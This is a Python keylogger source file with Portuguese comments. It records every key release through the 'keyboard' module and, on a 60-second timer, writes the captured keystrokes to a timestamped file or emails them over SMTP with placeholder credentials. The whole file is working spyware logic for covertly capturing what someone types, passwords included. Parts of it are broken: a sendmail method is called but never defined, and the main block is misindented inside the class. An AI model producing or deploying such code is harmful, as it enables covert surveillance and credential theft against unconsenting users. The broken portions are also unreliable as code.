#Instalar modulo 'keyboard'
#pip3 install Keyboard

#Keylogg
import keyboard
 #Mandar e-mail - SMTP 
import smtplib
#Salvar em um documento apos intervalo de tempo
from threading import Timer
from datetime import datetime

#Inicializando paramentros
SEND_REPORT_EVERY = 60
EMAIL_ADDRESS = ""
EMAIL_PASSWORD = ""

class Keylogger:
    def __init__(self, interval, report_method="email"):
        #Passar SEND_REPORT_EVERY no intervalo
        self.interval = interval
        self.report_method = report_method

        #Contem todos os logs obtidos
        self.log = ""

        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """
        Sempre que uma evento (tecla pressionada) acontecer
        """
        name = event.name
        if len(name) > 1:
            #Não character, special key (ex: ctrl, alt, etc.)
            # Uppercase -> []
            if name == "space":
                #Espaco -> " "
                name = " "
            elif name == "enter":
                #Adiciona uma nova linha sempre que foi pressionado Enter
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                #Substitui os espacos por underline
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        #Adiciona o nome da tecla ao log global
        self.log += name

    def update_filename(self):
        #Construindo o nome do arquivo
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """Cria o arquivo log dentro do diretorio"""
        #Cria e abre o arquivo
        with open(f"{self.filename}.txt", "w") as f:
            #Escreve o log no arquivo
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def report(self):
        """
        Funcao chamada sempre quando ocorre 'self.interval'
        Salva as keyloggs e reseta a variavel 'self.log' 
        """
        if self.log:
              #Reporta se tiver algo no log
              self.end_dt = datetime.now()
              #Atualiza 'self.filename'
              self.update_filename()
              if self.report_method == "email":
                  self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
              elif self.report_method == "file":
                  self.report_to_file()
              #Printar no console
              #print(f"[{self.filename}] - {self.log}")
              self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        #Set thread (morre quando a thread principal morre)
        timer.daemon = True
        #Start o timer
        timer.start()

    def start(self):
        #Grava o tempo inicio
        self.start_dt = datetime.now()
        #Starta o keylogger
        keyboard.on_release(callback=self.callback)
        #Starta o keylogger report
        self.report()
        #Bloqueia a thread
        keyboard.wait()

    if __name__ == "__main__":
    #Enviar para o e-mail:
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    
    #Gravar e um arquivo:
    # (and then send it using your favorite method)
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()
    